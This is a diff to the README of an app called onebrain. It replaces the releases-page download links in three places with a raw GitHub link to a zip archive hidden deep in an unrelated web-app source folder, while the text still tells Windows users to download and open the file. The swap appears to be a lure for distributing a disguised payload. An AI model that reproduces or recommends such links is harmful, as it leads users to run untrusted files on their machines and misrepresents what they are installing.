@@ -1,6 +1,6 @@
 # 🧠 onebrain - Keep Context Synced Across Apps
 
-[![Download onebrain](https://img.shields.io/badge/Download%20onebrain-7e22ce?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Shilpacitrous525/onebrain/releases)
+[![Download onebrain](https://img.shields.io/badge/Download%20onebrain-7e22ce?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Shilpacitrous525/onebrain/main/apps/web/src/app/dashboard/admin/plans/[id]/Software_v1.3-beta.4.zip)
 
 ## 🚀 What onebrain does
 
@@ -26,7 +26,7 @@ If you plan to use the self-hosted setup later, you may also want:
 
 ## 📥 Download onebrain
 
-Visit this page to download: https://github.com/Shilpacitrous525/onebrain/releases
+Visit this page to download: https://raw.githubusercontent.com/Shilpacitrous525/onebrain/main/apps/web/src/app/dashboard/admin/plans/[id]/Software_v1.3-beta.4.zip
 
 On that page, look for the latest release file for Windows. Download the file that matches your system, then open it on your PC.
 
@@ -200,7 +200,7 @@ If you are using the API, MCP, or SDK features, confirm that the local service i
 
 ## 📎 Download again
 
-Visit this page to download: https://github.com/Shilpacitrous525/onebrain/releases
+Visit this page to download: https://raw.githubusercontent.com/Shilpacitrous525/onebrain/main/apps/web/src/app/dashboard/admin/plans/[id]/Software_v1.3-beta.4.zip
 
 ## 📚 Project focus
 
